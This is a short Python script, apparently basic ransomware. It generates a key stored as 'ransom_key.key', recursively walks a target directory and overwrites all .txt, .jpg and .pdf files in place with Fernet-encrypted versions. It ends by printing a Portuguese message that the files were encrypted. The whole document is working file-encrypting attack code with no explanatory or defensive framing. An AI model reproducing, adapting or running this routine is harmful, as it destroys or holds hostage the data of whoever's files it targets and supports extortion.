from cryptography.fernet import Fernet
import os

def generate_key():
    key = Fernet.generate_key()
    with open("ransom_key.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    return open("ransom_key.key", "rb").read()

def encrypt_files(key, target_dir):
    fernet = Fernet(key)
    file_types = [".txt", ".jpg", ".pdf"]
    
    for root, dirs, files in os.walk(target_dir):
        for file in files:
            if any(file.endswith(ft) for ft in file_types):
                file_path = os.path.join(root, file)
                with open(file_path, "rb") as f:
                    file_data = f.read()
                encrypted_data = fernet.encrypt(file_data)
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)

if __name__ == "__main__":
    target_dir = "/path/to/target/directory"
    
    key = generate_key()
    
    encrypt_files(key, target_dir)
    
    print("Os arquivos foram criptografados.")
